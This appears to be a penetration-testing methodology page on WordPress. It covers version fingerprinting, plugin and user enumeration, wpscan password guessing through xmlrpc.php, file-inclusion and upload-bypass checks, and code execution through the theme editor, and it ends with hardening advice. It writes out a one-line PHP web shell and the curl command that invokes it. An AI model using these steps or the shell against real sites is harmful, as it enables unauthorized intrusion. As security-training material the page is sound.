---
layout: page
title: "WordPress"
subtitle: "Fingerprinting WordPress, enumerating plugins and users, and abusing admin access"
permalink: /methodology/common-apps/wordpress/
---

WordPress runs on PHP, usually with Apache and MySQL. Its popularity makes it a frequent target, and its extensibility means that much of the real risk sits in third-party themes and plugins. A WordPress test has two tracks: confirm the core version and enumerate the components, then check whether any component has a known weakness, and whether any account can reach the administrative editor.

## 1. Discover

- Check `robots.txt` for `wp-admin`, `wp-content` and sitemap references.
- Look for the `generator` meta tag and paths such as `/wp-content/` and `/wp-includes/`.

```bash
$ curl -s http://TARGET_URL/ | grep -i wordpress
```

## 2. Fingerprint the version and components

Theme and plugin assets are loaded with a `ver=` query string. Grep the page source for `themes` and `plugins` to identify each component and its version.

```bash
$ curl -s http://TARGET_URL/ | grep themes
$ curl -s http://TARGET_URL/?p=1 | grep plugins
```

Directory listing on `wp-content/plugins/` or a `readme.txt` inside a plugin folder can confirm a version.

## 3. Enumerate users and attack surface

- Author names in posts and the login error messages can reveal valid usernames. Compare the response for a known invalid user with the response for a suspected valid one.
- Check whether `xmlrpc.php` is enabled. It accepts login attempts and can be used for password guessing.

```bash
$ sudo wpscan --url http://TARGET_URL --enumerate ap --api-token TOKEN
$ sudo wpscan --password-attack xmlrpc -t 20 -U USERNAME -P /path/to/wordlist.txt --url http://TARGET_URL
```

Keep the thread count low where lockout is possible, and confirm the lockout policy before guessing.

## 4. Check known issues

Compare every plugin and theme version with known issues. Old copies left in the plugin directory are a common source of exposure, so check the Wayback Machine and any directory that still responds even after deactivation. The notes covered two plugin classes that are typical of this stage:

- **Local file inclusion**, where a parameter names a file to include without validation. Test with a path such as `/etc/passwd`.
- **Unrestricted file upload**, where the MIME check can be bypassed to store a script. The uploaded file is then requested directly.

> Verify the vulnerable version before exploiting. A plugin that matches the name but not the version is a false lead.
{: .warning }

## 5. Exploit through the admin editor

With administrator access, the theme editor allows PHP to be edited directly. Edit an inactive theme so that the primary theme is not disrupted, add a minimal command handler, and call it through the theme's file path.

```php
<?php
system($_GET[0]);
?>
```

```bash
$ curl "http://TARGET_URL/wp-content/themes/THEME_NAME/404.php?0=id"
```

The Metasploit module `exploit/unix/webapp/wp_admin_shell_upload` automates the same idea by uploading a plugin. It requires the correct virtual host.

## Decision points

- Admin login works: use the theme editor or plugin upload for code execution.
- Vulnerable plugin version confirmed: test the file inclusion or upload issue.
- `xmlrpc.php` enabled and users known: consider guessing, within the lockout policy.
- No vulnerability found: record the version and the findings, and move on.

## Defense

Remove unused plugins and themes, update core and components, disable file editing in the dashboard, enforce two-factor authentication for administrators, and restrict `xmlrpc.php`. See [Application Hardening](/methodology/common-apps/prevention/).
